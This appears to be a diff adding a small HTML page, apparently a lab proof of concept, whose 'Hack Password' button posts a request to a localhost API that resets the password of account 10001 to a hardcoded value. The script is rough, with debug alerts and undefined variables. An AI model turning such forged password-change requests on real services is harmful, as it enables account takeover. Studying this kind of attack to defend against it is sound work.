@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link href="https://fonts.googleapis.com/css?family=Dosis:400,700" rel="stylesheet">
+    <link href="sign_style.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+
+<!-- <form  onsubmit="validateLogin();"> -->
+
+
+<button type="submit" class="Login" onclick="validateLogin();">Hack Password</button>
+
+<script>
+
+
+    function validateLogin(){
+alert("fun called");
+  alert("updatePassword calld");
+
+    var request = new XMLHttpRequest();
+    request.open('POST', 'http://localhost:8080/api/v1/updatePassword', true);
+   // request.setRequestHeader("Content-Type", "application/json");
+    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+   // request.setRequestHeader('Access-Control-Allow-Origin','http://localhost:8080');
+    request.onload = function () {
+      alert("response came");
+      // Begin accessing JSON data here
+      //var data = JSON.parse(this.response);
+      alert(this.response);
+      if (request.status >= 200 && request.status < 400) {
+        alert("Password updated successfully for : Cid"+data.cid);
+
+     const h1 = document.createElement('h1');
+      h1.textContent = "Password Updated for "+data.cid;
+      app.appendChild(h1);
+      } else {
+        alert("Error while updating users details");
+      }
+    }
+    alert(cid);
+     var cid=10001;
+     var password='sSucks';;
+    // var obj = { 'cid' : cid, 'password': password     };
+    //request.send(JSON.stringify(obj));
+    var objString = "cid="+cid+"&password= "+password;
+    request.send(objString);
+    }
+
+</script>
+
+</body>
+
+</html>
